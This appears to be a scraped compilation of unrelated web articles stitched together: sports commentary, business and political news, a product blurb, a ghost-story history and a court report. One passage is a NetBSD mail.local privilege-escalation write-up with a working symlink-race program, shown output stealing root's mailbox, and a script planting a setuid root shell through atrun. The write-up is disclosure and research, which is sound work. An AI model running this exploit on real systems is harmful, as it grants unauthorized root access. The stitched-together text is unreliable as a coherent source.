In a 42-7 shellacking from the LA Rams, there aren't a whole lot of bright spots to latch onto for the Seattle Seahawks. But, in typical Kool-Aid guzzling fashion, I'm going to anyways because that's just who I am. Though you wouldn't have known it if you watched the game with me yesterday. Heck, I even cursed in front of grandma; merry Christmas everyone. The Holidays are off to a flying start.
Perhaps a solid ass kicking is just what the doctor ordered, organizations can justify bad decisions or not make difficult choices when faced with success. After all, we don't always succeed for the right reasons, there is some measure of luck/randomness in all things.
Jon Ryan, whom I previously slandered in Kicker Consideration with regards to cap space in the coming season(s), had a slightly above career average day kicking 47.5 yards per punt. And while Ryan did well, he was asked to punt nine times over the course of the game. Those of you playing shots for punts are likely not awake yet as I write this article early Monday morning, and may God have mercy on your hangover.
If your household is anything like mine, the punts themselves weren't really the focus of your attention. Though one of them was lower and more of a line drive, in my house I was mostly politely reminding the players on the other side of the television that there was a returner by the name of Pharoh Cooper who I would really prefer they tackle sooner rather than later. Alas, despite my constant and often vulgar encouragement the Seahawks allowed Cooper to run right through them on several returns averaging over 18 yards per punt return meaning punts averaged an anemic 29.2 yards change in field position. In addition, the two times Blair Walsh got to kick-off Cooper averaged 26 yards per return. All in all things appeared to go really well for the return coverage unit. The decision to keep special teams standout Tanner McEvoy really paid off, as was evident from his first reception of the game, and I'm sure Kasen Williams fans are now convinced it was the correct personnel move. I'm not salty, you're salty. Now, let's check in on our Ex:
That entire side of the stadium can see Hauschka taking a piss pic.twitter.com/sKHQIGrl3c — Busted Coverage (@bustedcoverage) December 17, 2017
It is painfully obvious after this last game that something is rotten within the special teams coverage as of late. Thank goodness the Rams only started seven of their 14 drives at the 50-yard line or beyond otherwise the Seahawks might have a real problem on their hands. My one consolation prize is that Hall of Fame digital general managers around the world will quiet the chorus calling for us to sign someone, anyone, other than Walsh despite there being a lack of good options. If only they had kicked those 12 extra field goals. At this point I would almost welcome giving Roberto Aguayo a shot just to let him prove before your very eyes that no, he isn't going to magically return to his college self. Instead, bring in Cameron Van Winkle of UW, he'd probably do it for some season tickets and a nice parking spot at CenturyLink.
In all seriousness, regardless of this last game the Seahawks will be fine.
A loss this bad is something that some Seattle fans have never had to face; that's not to say anything of “bandwagon fans” but only that the Seahawks have been great for six years and that's a long amount of time to bring in new viewers. It sounds as though I am being glib when I say this is what Seahawks fans used to endure when watching in the 1990s but really I'm not, this is old hat. It wasn't pretty, though you could argue this was worse because of the pre-game hope and playoff implications.
But to be perfectly honest, I was basically numb by halftime and hopefully you were too. Don't take the loss, or this article, too seriously. Failures such as this one don't define a franchise, and if they do it was a house of cards to begin with. Seattle will bounce back, many fans have been through worse together. A profound loss can be instructional for players, coaches, and fans alike and humble pie can work wonders for the soul. Since it's the holidays and my diet has gone to hell anyways so pass it down the table, I have some feelings to eat.
16 nuclear reactors to be ready by 2030
Saudi Arabia intends to become a leader in renewable energy by building 16 nuclear reactors with a combined capacity of 22GW, which is about half of the Kingdom's current electricity output. The project is estimated to cost of more than $100 billion.
Abdul Ghani bin Melaibari, coordinator of scientific collaboration at King Abdullah City for Atomic and Renewable Energy, confirmed the plan, adding that the first two reactors would be ready within 10 years.
However, he pointed out the cost building nuclear reactors in the Kingdom would be comparatively higher because of its extreme hot climate. He also stressed the need to train Saudis to operate and maintain such plants.
Melaibari said the cost of building and operating nuclear plants in France, Russia, South Korea and Japan differs from one country to another, depending on the technology they adopt, infrastructure facilities in place and the availability of cheap manpower.
Saudi Arabia and its Gulf neighbors regard nuclear power as a way to meet rising electricity demand while reducing reliance on polluting fossil fuels, say analysts.
“After 10 years we will have the first two reactors,” Melaibari told Arab News. “After that, every year we will establish two, until we have 16 by 2030. We would like to cover 20 percent of electricity needs using nuclear energy.”
He estimated the cost of each reactor to be around $7 billion, adding that the Kingdom is in the process of concluding deals with specialized companies to implement the project.
Many nations have taken a step back from nuclear plans following the accident at the Fukushima Daiichi plant in Japan. But GCC states are pursuing their plans with major investments in nuclear power.
The UAE in December 2009 awarded a South Korean consortium the contract to build four nuclear power plants worth $20.4 billion.
Power demand in Saudi Arabia is estimated to grow seven to eight percent during the next 10 years. It is the largest economy of the GCC, with an annual GDP of $622 billion and a GDP per capita of $24,200.
Today, India presents a mouthwatering proposition for anyone wanting to do business there. It has 280 million internet users, a figure which will grow to 640 million by 2019. This is a huge population to exploit for any company whose business plan hinges on the internet as a primary distribution medium.
Few industries are therefore as excited and anxious about their fortunes in India as the entertainment industry, specifically the various global entertainment juggernauts who now see the net -- not TV or the movie theatre -- as the medium through which they can leverage their products. For proof of this, just take a look at the lineup that was in attendance to fete Indian Prime Minister Narendra Modi's recent visit to the US, amongst them the bosses of News Corp, Sony Entertainment and Time Warner.
So crucial is India today in their plans that none of them would dare miss out on the opportunity to hob-nob with Modi lest one of their competitors seize the advantage of the moment presented to them.
For movie-streaming and new-production-house-on-the-block Netflix, India is the holy grail that will allow it to propel its customer base from the existing 65 million to hundreds of millions of movie-crazy customers. Towards this purpose, the company plans on spending a staggering $6 billion this year alone on content.
However, there remains one obstacle in its plans for world domination: Eros, a little known Indian company globally, but one that has in just a few decades become the number one distributor and producer of local films in India, especially in Hindi cinema, or Bollywood, as it is often called.
Netflix may be the purveyor of goodies from the world's largest money-making machine in entertainment, Hollywood, but Indians wholeheartedly love their local fare. Eros, with 3,000 existing copyrighted movies in its kitty, some of them constituting the most popular movies ever made in India, is betting that this arsenal will give it a massive first-mover-advantage over any company, local or foreign, wanting to dominate the streaming game in India. In a country where people remember where they were when they watched a movie, this is pure gold.
Eros is "exactly where Netflix wants to be in the next three to five years," said the company's executive chairman, Kishore Lulla, whose father started the company in the 1970s. "I'm already there."
Today Eros releases over 70 movies a year, more than any studio in the US. Apparently, around 40 percent of India's box office revenues come from Eros movies.
The reason for Eros suddenly vaulting into the unlikely position of front-runner is apparently thanks to the ambition of a minority investor, London-based Knight Assets. Eros originally had its sights on launching a TV channel. However, when Knight cobbled together a stake of more than 2 percent and then began to implement a full-court press for a digital-heavy strategy, the company decided to change tack.
It may just turn out to be a prescient bet. Cricket and religion are two of three things that India lives and dies for. The third? Films, something that Indians have always been voracious consumers of. The country is easily the largest producer of films in the world at over a 1,000 per year easily outstripping the US at some 200-300 per year. (Of course, US box office revenue at $51 billion easily outstrips that of India's $4.5 billion.)
That 1,000 plus annual film release number includes titles from over 20 disparate film industries other than Hindi cinema. These industries are in different languages, have storied histories going back 70 years and boast superstars rivalling those of Bollywood, or even Hollywood, such as Rajnikant from Tamil cinema. It is a complex and dynamic film terrain.
This may not be that surprising when you consider that India has a storied history and pedigree in the evolution of global film; its first silent feature, Raja Harischchandra, was made as far back as 1916. India's first talkie, Alam Ara, in 1931, came only five years after Warner Brother released its first, Don Juan. (The more famous Jazz Singer came out a year later.)
Could Eros leverage all of this history into cash? It already claims to currently have 26 million users, approximately half of that of Netflix. According to Bloomberg, a basic ad-supported service is free, while a premium category costs 50 rupees (around 80 cents). Subscriptions are at multiples of this number in overseas territories housing non-resident Indians flush with foreign exchange, as well as nostalgia for the motherland, both translating to good business for Indian entertainment.
Macquaire, Eros' investor is betting that the digital service will boost Eros' customer base to a total of 40 million users by 2016 and 133 million in 2020, and that in-app purchases will make up the bulk of their revenues, growing from $198 million this year, along with $28 million in profit, to around $664 million in five years. Bloomberg reports that the markets have vindicated the about-face strategy, sending Eros' stock soaring by close to 60 percent and awarding a market share of about $1.94 billion to the company.
This is the rosier side of the picture for Eros. Unfortunately for them, there are considerable challenges as well. Netflix is one of them. For a company that has deep cash reserves and has risen from a scrappy underdog to perhaps the leading producer of quality, innovative content in the world that are peopled by hi-wattage stars -- wooing top Indian talent and creating ground-breaking shows here should be a cinch, especially considering how far the dollar goes in India.
Netflix, however, isn't the only game in town. Reliance Jio, the telecom business of Reliance Industries, India's second-largest firm by market cap, is gunning for a huge double-play in telecom and entertainment. India's richest guy Mukesh Ambani -- you know, the guy who built the $2 billion house in the heart of south Mumbai right next to a large slum -- is rolling out his own pan-India 4G telecom network by the end of the year. Reliance also recently scarfed up the media empire Network 18, which includes education, entertainment, publishing and news TV channels as well as e-commerce properties. Getting into filmed entertainment is a logical next step.
Then there's Rupert Murdoch's Star network which has already launched its app, Hotstar, earlier this year with a focus on film and cricket, and has already been downloaded some 25 million times at last count. Other sites such as Spuul and BoxTV have already collected cash and customers in this space. Even music streaming sites want to launch incursions on Eros' territory. Streaming music start-up Saavn raised a mammoth $100 million in new funding largely to fuel a foray into video services.
If these weren't enough to inspire serious concern, there's that company you may have heard of called Amazon, already a dominant e-commerce player in India, licking its chops at the prospect of tapping into the entertainment sector. Eros is a minnow against these deep-pocketed players and could easily get stomped upon by the likes of a Netflix or an Amazon or a Star trying to make its mark.
There are other issues. One is the diversity of content one needs to strategise for, especially considering the 20-odd languages and a variety of genres -- not an easy task. Also, India is still wedded to cash for transactions, and although a number of online payment solution providers have begun to emerge, online transactions are still a major concern. Indians are also very fond of pirating content since it's virtually impossible to track over there. A corollary to this is that Indians therefore have no pre-disposition of paying a monthly fee for something they customarily regard as free.
Eros does however have a few major advantages. The film business is very much a club and in this club, relationships go a long way. When Kishore took over from the elder Lulla, Eros had become the number one distributor in the UK for Indian cinema and was a major one in other territories. Getting into film production was a logical next step even though, as Forbes put it, Kishore was wary of the nefarious and shady world of Bollywood film financing.
Lulla began to forge close ties with Bollywood talent and promised to share revenue with them. His company quickly became known for generating hits. For instance, as Forbes reports, in the first nine months of fiscal 2014 ending in December, four out of the top 10 Hindi films are from the Eros stable. This hit-making propensity will undoubtedly keep its stables of loyal talent happy and secure, especially in new ventures.
Lulla also adopted a business model, de-rigeur in the west, but at the time not so much in India, where various rights (TV, international, music, satellite) were pre-flogged to cover most of the cost of financing, mitigating risk. Both these attributes will come in handy as Eros tries to spin-out cost effective original programming.
India is still only at a 30 percent smartphone penetration rate. By the time the rest of the country gets wired, Eros will be betting that it will be much more uniquely positioned than a Netflix or an Amazon or a Reliance to rule the world of digital entertainment.
Spawn your shell like it's 90s again!
This article is a quick walk-through to gaining root privileges in the NetBSD, since it's so 90s you can play Captain Jack [3], or [4] [5] if you prefer polish disco, just to feel the atmosphere while reading. Really, do it! ;)
Abusing SUID files should be dead in 90s, but surprisingly it's still alive. By auditing Coverity Scan reports for the NetBSD SUID files I accidentally found a Time To Check To Time To Use [1] issue in mail.local(8) which luckily can be turned into privilege escalation! You may ask what's mail.local(8)... It simply delivers message from standard input to chosen user mailbox - check man page if you wish to know more. The utility appears also in other BSDs, but it seems that OpenBSD fixed the issue almost 20 years ago and FreeBSD uses sendmail(8) which provides its own implementation.
The bug
177 static int 178 deliver(int fd, char *name, int lockfile) 179 { 180 struct stat sb; 181 struct passwd pwres, *pw; 182 char pwbuf[1024]; 183 int created, mbfd, nr, nw, off, rval=EX_OK, lfd=-1; 184 char biffmsg[100], buf[8*1024], path[MAXPATHLEN], lpath[MAXPATHLEN]; 185 off_t curoff; [...] 200 (void)snprintf(path, sizeof path, "%s/%s", _PATH_MAILDIR, name); [...] 213 if (!(created = lstat(path, &sb)) && 214 (sb.st_nlink != 1 || S_ISLNK(sb.st_mode))) { 215 logwarn("%s: linked file", path); 216 return(EX_OSERR); 217 } 218 219 if ((mbfd = open(path, O_APPEND|O_WRONLY|O_EXLOCK, 220 S_IRUSR|S_IWUSR)) < 0) { 221 if ((mbfd = open(path, O_APPEND|O_CREAT|O_WRONLY|O_EXLOCK, 222 S_IRUSR|S_IWUSR)) < 0) { 223 logwarn("%s: %s", path, strerror(errno)); 224 return(EX_OSERR); 225 } 226 } [...] 262 if (created) 263 (void)fchown(mbfd, pw->pw_uid, pw->pw_gid); 264 265 (void)fsync(mbfd); /* Don't wait for update. */ 266 (void)close(mbfd); /* Implicit unlock. */ [...] Source: https://nxr.netbsd.org/xref/src/libexec/mail.local/mail.local.c
The bug is placed in deliver() function of mail.local:
The code creates path from _PATH_MAILDIR (which is "/var/mail/") and username at line 200, then lstat is done at line 213, if file does not exist (or it's not a symlink) the path is opened at line 219. What if somebody would quickly replace object between lstat(2) and open(2) under the checked path? Well, then arbitrary file can be opened, some data will be appended, and then, eventually, the ownership will be changed. It's the classical race condition example.
The cool thing about this particular issue is that no memory corruption issues are involved, so we don't need to deal with PIE, ASLR and so on. Instead we got pretty nice race, thus it's all about the timing.
Errr... so what? Time window is too small, they said!
No time window is too small to be exploited! It's just a matter of trying hard enough. Let's analyze carefully the case that we have:
mail.local |attacker ----------------------------------------------------------+--------------------------------------------- lstat() - returns ENOENT - the named file does not exist. | | symlink() - an attacker creates symlink that | points to a sensitive file. open() - opens sensitive file through symlink | (...) | fchown() - changes owner to user | | \o/ PROFIT \o/
The moment between lstat(2) and open(2) is our chance to plant malicious symlink. This is a classic race condition example, you may think it could take ages to trigger the above scenario, but in fact it can occur within a few seconds. Let's steal /var/mail/root file:
shm@netbsd-dev ~ $ ls -al /var/mail/root -rw------- 1 root wheel 38 Jul 21 16:08 /var/mail/root
We need two workers. First is supposed to create symlinks, second is responsible for executing mail.local(8).
shm@netbsd-dev ~ $ cat test.c #include <stdio.h> #include <unistd.h> #include <fcntl.h> #include <stdlib.h> #include <sys/types.h> #include <sys/stat.h> #define STEALPATH "/var/mail/root" #define MAILBOX "/var/mail/shm" int main() { int fd; struct stat sb; for(;;) { unlink(MAILBOX); symlink(STEALPATH, MAILBOX); sync(); unlink(MAILBOX); fd = open(MAILBOX, O_CREAT, S_IRUSR | S_IWUSR); close(fd); sync(); if (lstat(STEALPATH, &sb) == 0) { if (sb.st_uid == getuid()) { fprintf(stderr, "[+] won race!
"); return 0; } } } /* NOTREACHED */ return 1; } shm@netbsd-dev ~ $ cc -o test test.c shm@netbsd-dev ~ $ while true ; do echo x | /usr/libexec/mail.local shm 2> /dev/null ; done & [3] 5084 shm@netbsd-dev ~ $ time ./test [+] won race! real 0m3.093s user 0m0.000s sys 0m2.987s shm@netbsd-dev ~ $ ls -al /var/mail/root -rw------- 1 shm shm 77 Jul 21 16:12 /var/mail/root
Within few seconds, we're able to steal root's mailbox, not bad!
Uh I see, what's next?
So we can become an owner of any file in the system, using that possibility into privilege escalation should be easy - actually, there are many ways to do it. One of them is to own passwd, master.passwd and company in order to manipulate system accounts - but tha intrusive and overcomplicated. Instead of this, let's see what's executed repetitively by administrative accounts, own that and change its context to get a shell.
Natural candidate is crontab(8), default tasks look as follows:
[...] #minute hour mday month wday command # */10 * * * * /usr/libexec/atrun # # rotate log files every hour, if necessary 0 * * * * /usr/bin/newsyslog # # do daily/weekly/monthly maintenance 15 3 * * * /bin/sh /etc/daily 2>&1 | tee /var/log/daily.out | sendmail -t 30 4 * * 6 /bin/sh /etc/weekly 2>&1 | tee /var/log/weekly.out | sendmail -t #30 5 1 * * /bin/sh /etc/monthly 2>&1 | tee /var/log/monthly.out | sendmail -t [...] Source: https://nxr.netbsd.org/xref/src/etc/crontab
Of course we do want to wait a month or even a day for shell spawn. The best option is to change atrun(1), triggered every 10 minutes - which is an acceptable time to wait for root privileges, isn't it?
What to execute? The simplest idea is to copy ksh to /tmp directory and set SUID bit. Example script is uber simple:
#! /bin/sh cp /bin/ksh /tmp/ksh chmod +s /tmp/ksh
Upon this script is executed, we get SUIDed shell in /tmp, ksh doesn't drop effective uid and gid, so we can get it 0 by using setuid(2) and setgid(2).
Putting things together
#include <stdio.h> #include <unistd.h> #include <fcntl.h> #include <signal.h> #include <stdlib.h> #include <string.h> #include <err.h> #include <sys/wait.h> #define ATRUNPATH "/usr/libexec/atrun" #define MAILDIR "/var/mail" static int overwrite_atrun(void) { char *script = "#! /bin/sh

We have all the pieces, let's craft an exploit:
Code is rather self-explanatory, executing is more interesting:

Final words
NetBSD is an elegant operating system with many exciting features as rump(8) or veriexec(8), bugs just happen! The best thing we can do, besides fixing this particular vulnerability [7], is to get rid of SUIDs, like some of our friends already did. But radical step requires major changes.
Hope to bring you back to the 90s. If this bug is older than you, I'm sorry, you missed opportunity to live in the best decade in history of this planet. OpenBSD left this bug in the 20th Century [6], just where it belongs. Particularly I like few lines from this patch:
/* paranoia? */ if (fsb.st_nlink != 1 || S_ISLNK(fsb.st_mode)) { err(NOTFATAL, "%s: linked file", path); goto bad; }
Exactly, better paranoid than sorry!
Story highlights Donald Trump is asked at Iowa appearance about remarks Muslims by supporter
He's defended his reaction to comments
Urbandale, Iowa (CNN) Donald Trump on Saturday responded to a question from CNN about whether Muslims pose a danger to the country, saying: "I love the Muslims. I think they're great people."
The Republican presidential front-runner made the comment after addressing high school students here at their homecoming Saturday night.
During a question-and-answer session with students, Trump was unable to avoid being asked about the latest political controversy dogging his campaign: his decision not to correct a supporter this week who called President Barack Obama a Muslim.
One student told Trump that she considered Muslim-Americans to be an important segment of the country. They asked whether the billionaire businessman would consider putting a Muslim in his Cabinet or on his ticket.
"Oh, absolutely," Trump responded. "No problem with that."

MCD Election Results 2017: Arvind Kejriwal's AAP blames rigged EVMs for defeat, MLA Alka Lamba denies
Highlights AAP lost the significant Delhi election by placing second Party blames rigged voting machines for their loss; Alka Lamba disagrees Centre had sanctioned 3,000 crores to poll panel to upgrade machines
MCD Election Results 2017: Arvind Kejriwal has accused Election Commission of enabling BJP.
After it lost a significant election today in Delhi, the Aam Aadmi Party (AAP) headed by Arvind Kejriwal blamed rigged voting machines, describing their alleged manipulation as "a bitter truth" being used to "dictate democracy."One AAP leader, however, did not subscribe to that premise. Alka Lamba, a legislator, said that "EVMs (Electronic Voting Machines) are not a problem in my area. We will support those elected by the people," she said, adding, "I know what the ground reality was and where we did faults (sic), I take complete onus."Three Aam Aadmi candidates from her constituency - the famous old city area of Chandni Chowk - were defeated today in the election for local municipal corporations. Ms Lamba, 41, was removed last year as an official spokesperson for her party. As counting began in the capital today , and leads showed Mr Kejriwal's party placing third (it finished as runner-up to the BJP), Deputy Chief Minister Manish Sisodia visited his boss' residence. Hours later, he emerged to say that AAP maintains that voting machines were used to ensure his party's defeat. "We may be laughed at," he said, "but we cannot quit our campaign against this bitter truth." Senior minister Kapil Mishra was far more temperate. While problems with machines should be examined, he said, "Yes, we have to reconnect with the people and understand reasons for this defeat."The allegations of gamed voting machines were levelled first by Mr Kejriwal after he was not able to win Punjab last month despite a lengthy campaign in the state that was centred on his personal brand. Most exit polls predicted that AAP would either win Punjab or place a strong second. In fact, the Congress won easily. Even AAP's detractors have acknowledged that for a novice -AAP was founded in 2012 - it is an admirable feat to have emerged as the main opposition party in a state beyond Delhi. But Mr Kejriwal remains convinced that he was robbed of Punjab and has accused the autonomous and powerful Election Commission of enabling BJP victories in different states.Other opposition parties including the Congress formed a separate bloc to make the same allegation, though the Congress has found it hard to explain how it can allege machine-tampering only in states that it lost, and accepting its victory in Punjab as legit.The Commission has repeatedly said that its machines cannot be manipulated and says that next month, it will hold a 10-day hackathon to prove its point. Mr Kejriwal, an IIT graduate, has said if he is given 24 hours with one of the machines, he will be able to demonstrate its defects. Last week, the centre sanctioned nearly 3,000 crores to allow the Election Commission to buy upgraded machines that provide a paper receipt for each vote that is cast. VVPATS -Voter Verifiable Paper Audit Trails - print out a slip of paper that is visible to the voter for a few seconds and confirms the candidate selected before the receipt falls into a sealed box. The next general election in 2019 will be conducted entirely with this new technology.
Ramping up Torg and Ulisses Social Media
Starting today, we are going to be increasing our social media presence for Ulisses North America as a company and for the Torg Eternity product line specifically.
Since Gen Con, we have kept news of Torg fairly quiet, and many fans are eager to know what's coming next and, more importantly, when. To help spread that information, we are beginning to add accounts for both the Torg brand and for Ulisses North America on a variety of social media venues. For right now, we have
a Torg Facebook site
a Ulisses North America Facebook site
and a Ulisses North America Twitter account.
The Torg section has also been opened up in the Ulisses-US forums, so please join us and start your discussions!
Buttons for all these locations have been added to the relevant pages here on our main website, and more accounts will be coming soon!
Up until now, much of our information has been focused around The Dark Eye plus a bit of Conan, so it has made sense for our primary communication steams to be attached to those specific brands. Moving forward, we want to be able to focus our information in a few places while still allowing people to find us and share in a community based on their favorite brands. We will generally try to avoid cross-promotion (though it may happen sometimes), so make sure you follow the Ulisses North America accounts for information on ALL our product lines. This includes information about Fading Suns as that becomes available.
We're tying this announcement to Torg specifically because we also want to tell you that very soon we will be releasing the Torg Eternity Quick-Start rules!
We've had quite a few requests for playtest and demo information, and we've decided to make our next phase as public as possible. We're going to be opening up the Quick-Start rules so that everyone can try them out and tell us what they think. Keep watching here and on these social media accounts for that announcement!

Ease of installation – Simply insert your barrel assembly into the M4E1 upper, tighten it using the provided barrel nut and wrench. Slide your rail on and tighten the rail screws. Within minutes you have a modular, free-floated rail.
The M4E1 Enhanced Upper features M4 feedramps, .250 takedown pinholes, laser engraved T-marks, and comes assembled with dust cover and forward assist. The M4E1 Enhanced Upper works with Aero Precision handguards, but also fits most BAR-system handguards. Both barrel nut and wrench are included, however these uppers are not piston-kit compatible.

A North Texas man trotted into a Taco Bell in Commerce on horseback.
The horse and his rider got big laughs from people inside the restaurant that night and even more laughs from people who saw video of the incident online.
Lathan Crump posted video of the incident over the weekend with the description, “When you roll through Taco Bell in Texas but the Drive-thru is out of order.”
Crump said he had just competed in tie-down calf roping on his horse at the Commerce rodeo Saturday. It's his tradition to go to Taco Bell after.
"Well it's just kind of an everyday thing for us to do stuff like that,” the Commerce cowboy said. “It's not really a big deal, but I guess everybody else don't ever see nothing like that."
It took just a little egging on from friends to get him back in the saddle at the restaurant, trotting through the doors for tacos.
But there's more to this duo than their moment of fast food fame.
Crump and his family are third generation cowboys and cowgirls in Campbell, Texas. He breaks and trains horses. And he's had his American Quarter Horse aptly named Hollywood since it was a colt.
"[He] travels around with me everywhere and every day and just hardly do anything without him,” said Crump. "Everybody got a big laugh about it. And it's been blowing up big all over social media."
Police say unless someone complains, and no one apparently did, officers won't take action.
Taco Bell did not return calls for comment.
Crump plans to stay away from the taco chain for a little while and let Hollywood live up to his name.
Commerce is located in Hunt County, about 65 miles northeast of Dallas.

In early October 1896, 23 year old Zona Heaster met Trout Shue and instantly fell in love with the powerful 35 year old blacksmith. Though her mother vehemently objected, within weeks the two were married. Three months later Zona was dead. Her death was ruled to as accidental but rumors of murder persisted. As far as her mother, Mary Jane Heaster, was concerned the rumors were verified when Zona's ghost appeared to her four nights in a row and told her of Trout's cruelty. Mrs. Heaster's persistent telling of this story prompted authorities to exhume Zona's body, and find that her neck had been broken. Trout Shue had been accused by the Greenbrier Ghost.
Date: January 23, 1897
Location: Greenbriar, West Virginia
Elva Zona Heaster, was born in Greenbrier County, West Virginia in 1873. She is often portrayed as pure and innocent, but in November 1895, at age 22, Zona had a child out of wedlock. On a visit to the blacksmiths shop with her family the following October, she met and became infatuated with the handsome blacksmith, Trout Shue. She returned soon after and let him know she was interested. Zona and Trout had a whirlwind courtship and were married on October 20.
Erasmus Stribbling Trout Shue was born in 1861 or 1862 in Augusta County, Virginia and grew up in Droop Mountain, West Virginia. He was as at least eleven years older than Zona. His first name was later changed to Edward, but in Greenbrier County he was known as Trout.
On January 23, 1897, just three months after the wedding, the body of Zona Heaster Shue was found at the foot of a staircase, by a neighbor boy hired by the Shues to do chores. The boy told his mother what he had seen and she sent for the doctor. Dr. George W. Knapp arrived to find that Trout had taken his wife to the bedroom and dressed her for burial. She was lying on the bed wearing a high-necked dress. Dr. Knapp began to examine the body, but it so distressed Trout that his examination was incomplete. He first reported the cause of death as “an everlasting faint” but later changed the cause to “childbirth.” If Zona was pregnant at the time of her death she had told no one.
Zona's mother, Mary Jane Heaster, had never approved of the marriage and after the body was found she was convinced that Trout had murdered her daughter. She began to pray that Zona would come and tell her how she died. Then strange things began to happen. She washed a white sheet that had been in the coffin and the wash water turned red. The sheet turned a pink color that she could not remove. About four weeks after her daughter's death Mary Jane began having visions. Four nights in a row, Zona's ghost came to her and told her that Trout had abused her. The ghost told Mary Jane how she and Trout had argued the day of her death. She said thatTrout attacked her and broke her neck. As the ghost was leaving, she turned her head around until it was completely facing backward.
The tale of Zona Shue's murder is a ghost story, handed down generation to generation in the oral tradition. Facts in the case are sparse; stories vary from teller to teller and often contradict each other. When supernatural elements are added to the mix they tend to push out the truth. This synopsis will be limited to verifiable facts.Zona was not his first wife; Trout had been married twice before. In 1885 he married Ellen Cutlip and in 1887 they had a daughter, Girta Lucretia Shue. In 1888 they were separated and in 1889 divorced; Girta was raised by Ellen's parents. In 1894 Trout married Lucy Tritt and less than a year later Lucy was dead. There is no record as to how Lucy died, stories of her death range from falling on the ice while pregnant, to being hit on the head by a brick accidently dropped by Trout, to being deliberately poisoned by Trout.Trout Shue's life seemed to be nothing but turmoil. Between his first two marriages he was arrested for stealing a horse and spent two years in prison. After his second wife died he moved to Greenbrier County to start a new life. He found work as a blacksmith, a lucrative trade he had learned from his father. His marriage to Zona was another step toward a better life.Mary Jane took her story to the prosecutor, John Alfred Preston. Although he would not reopen the case for a ghost story, Mrs. Heaster was persistent enough that be begun asking questions of others in town. Dr. Knapp admitted that his examination had been incomplete but he had seen bruises on her neck. Neighbors told Preston about Trout's strange behavior at the wake. He never left the side of the coffin and never let anyone look to closely at the body. He had wedged her head in the coffin between a pillow and the sheet to keep it straight. Some said they had seen her neck flopping loosely before it was in the coffin.The body was exhumed for reexamination. During a complete autopsy, doctors found that Zona's neck had been broken. It had been dislocated between the first and second vertebrae. Her windpipe was crushed and her neck was bruised as if she had been strangled. Following the autopsy, Trout Shue was arrested for the murder of his wife Zona.
The Palms casino resort in Las Vegas is suing to recover $2.66 million in gambling debt it says was racked up by indicted former "whale" and Fry's Electronics Inc. official Ausaf "Omar" Siddiqui.
Siddiqui was sued by the Palms on Sunday and again on Monday by Fry's in U.S. Bankruptcy Court in San Jose, Calif. Both actions were lawsuit-like adversary complaints.
Siddiqui was indicted in December 2008 in what the IRS described as a kickback scheme in which, as vice president of merchandising and operations, he demanded and received $65.6 million in kickbacks from Fry's vendors to put their products on Fry's shelves. The money was used to support his lavish lifestyle and gambling excursions, the government said.
Sentencing is set for December after a Fry's official said the former executive pleaded guilty in the scheme, the San Jose Mercury News reported.
Siddiqui, of Palo Alto, Calif., filed for Chapter 7 bankruptcy liquidation on July 13, listing assets of $6.95 million against liabilities of $136.56 million – including millions of dollars owed to Las Vegas casinos for gambling debts.
A San Jose Mercury News story described him as once being a prized "whale," or high-roller in Las Vegas "who demanded that casino butlers and bellboys call him 'Mr. S' and fill his room with golden raisins, bottles of Dom Pérignon and Glitterati Mentissimo peppermints adorned with a single rose."
Attorneys for the Palms, in Sunday's complaint, said Siddiqui's debt to the Palms should not be discharged, or canceled, through his bankruptcy because the debt involved fraud.
The Palms say in the complaint that on Aug. 23, 2008, Siddiqui obtained $2.545 million in gambling credit of which $2.045 million in principal amount is unpaid – and that $2.663 million is now due including interest, collection costs and attorney's fees.
Siddiqui had written a personal check against his Wells Fargo account for $2 million to cover most of the debt, but the Palms later found he had stopped payment on the check "and that the instrument was worthless," the complaint says.
"Defendant's conduct in failing to disclose that he had wrongfully stopped payment on his personal check number 1609 assured that the personal check would be dishonored, and constitutes defendant's intentional and deliberate fraud against plaintiff, or otherwise obtaining credit by false pretenses and material representation," the Palms complaint says. "Grounds exist for denying dischargeability of defendant's debt to plaintiff, as defendant obtained credit for the purpose of gambling through the use of materially false statements in writing."
Siddiqui's bankruptcy filing listed numerous gambling debts including money possibly owed or owed to Aspinalls in London; the Barona casino in Lakeside, Calif., Caesars Palace in Las Vegas ($5.7 million), the Hard Rock in Las Vegas ($1 million), Les Ambassadeurs in London, Maxims in London, the Mohegan tribe in Connecticut and the MGM Grand and Mandalay Bay in Las Vegas (combined $11.5 million).
A separate complaint was filed in the bankruptcy case on Monday by Fry's, which asserted that as part of the kickback scheme Siddiqui had obtained money through his employment at Fry's under false pretenses and that he owes Fry's $65.6 million
Siddiqui's bankruptcy attorney couldn't immediately be reached for comment on Monday.
Michigan's economy is enjoying some of the lowest sustained jobless rates since before 9/11, with a return of thousands of manufacturing jobs swept away by the Great Recession. With joblessness below 5 percent, that's been mostly good news, despite wages that remain generally stagnant. But nowhere is Michigan shining brighter than West Michigan, where two counties, Kent and Ottawa, account for one fifth of all new jobs in the state, despite comprising just one-tenth of the population. In Ottawa, the April jobless rate was 2.7 percent. It was 2.9 percent in Kent. Both are historic lows not seen since 2000. An estimated 70 percent of employers tell business leaders that finding qualified workers is one of their toughest jobs right now. The success isn't limited to those two: Nearby Barry and Allegan counties, just south of Grand Rapids and Holland, are also doing well and a string of counties running from Lansing to Lake Michigan have among the lowest jobless rates in the state. It's a success story that has caught the eye of economists and others looking to West Michigan for economic guidance. "It's certainly something that people talk about," said Charley Ballard, an economist at Michigan State University. He noted that the region's population is growing, it has high per-capita income and its economy has been running ahead of state economic trends for years. One stubborn downside: Wages are still mostly at 2010 levels, though they are rising slowly. In West Michigan, only Ottawa showed slight gains from 2010, when adjusted for inflation. Wages are down nearly 10 percent in Allegan County and up about 1 percent in Barry and Kent. Statewide, average weekly wages remain down 2.1 percent since 2010, though they rose nearly 3 percent from 2014 to 2015. But the low jobless rate in West Michigan should help push wages up, said Robert Dye, chief economist for Comerica Bank. Job growth may slow, he said, but employers will have to pay more to get the workers they require, he said. While some look across the country to find replicable models of economic revival, like the steel-to-higher-education transformation in Pittsburgh, others say that other regions in the state can just look down I-96. "I think we have a model in our state. We don't need to look to Pittsburgh," said Sean McAlinden, vice president for strategic studies and chief economist with the Ann Arbor-based Center for Automotive Research. "But it's a really difficult model to follow."
Not as easy as 'just add water'
